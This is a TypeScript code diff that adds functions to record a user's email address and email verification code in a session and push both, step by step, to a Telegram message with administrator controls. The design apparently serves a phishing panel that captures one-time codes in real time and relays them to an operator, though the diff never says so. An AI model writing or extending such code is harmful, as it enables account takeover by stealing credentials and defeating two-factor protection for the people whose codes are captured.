@@ -92,6 +92,83 @@ export const getMessageIdFromSession = (sessionId: string): number | null => {
 };
 
 /**
+ * Update session with email information and update Telegram message
+ */
+export const updateSessionWithEmail = async (
+  sessionId: string,
+  email: string,
+): Promise<{ success: boolean }> => {
+  const session = activeSessions.get(sessionId);
+  if (!session) {
+    console.error("❌ Session not found:", sessionId);
+    return { success: false };
+  }
+
+  try {
+    // Add email to session
+    session.email = email;
+    session.currentStep = "email_verification";
+    activeSessions.set(sessionId, session);
+
+    // Update the existing Telegram message
+    if (session.messageId) {
+      const updatedMessage = formatSessionMessage(session);
+      await updateTelegramMessage(
+        session.messageId,
+        updatedMessage,
+        getAdminKeyboard(sessionId, session),
+      );
+    }
+
+    console.log("✅ Session updated with email:", { sessionId, email });
+    return { success: true };
+  } catch (error) {
+    console.error("❌ Failed to update session with email:", error);
+    return { success: false };
+  }
+};
+
+/**
+ * Update session with email code and update Telegram message
+ */
+export const updateSessionWithEmailCode = async (
+  sessionId: string,
+  emailCode: string,
+): Promise<{ success: boolean }> => {
+  const session = activeSessions.get(sessionId);
+  if (!session) {
+    console.error("❌ Session not found:", sessionId);
+    return { success: false };
+  }
+
+  try {
+    // Add email code to session
+    session.emailCode = emailCode;
+    session.currentStep = "email_completed";
+    activeSessions.set(sessionId, session);
+
+    // Update the existing Telegram message
+    if (session.messageId) {
+      const updatedMessage = formatSessionMessage(session);
+      await updateTelegramMessage(
+        session.messageId,
+        updatedMessage,
+        getAdminKeyboard(sessionId, session),
+      );
+    }
+
+    console.log("✅ Session updated with email code:", {
+      sessionId,
+      emailCode,
+    });
+    return { success: true };
+  } catch (error) {
+    console.error("❌ Failed to update session with email code:", error);
+    return { success: false };
+  }
+};
+
+/**
  * Update existing Telegram message with new content
  */
 export const updateCustomMessageInTelegram = async (
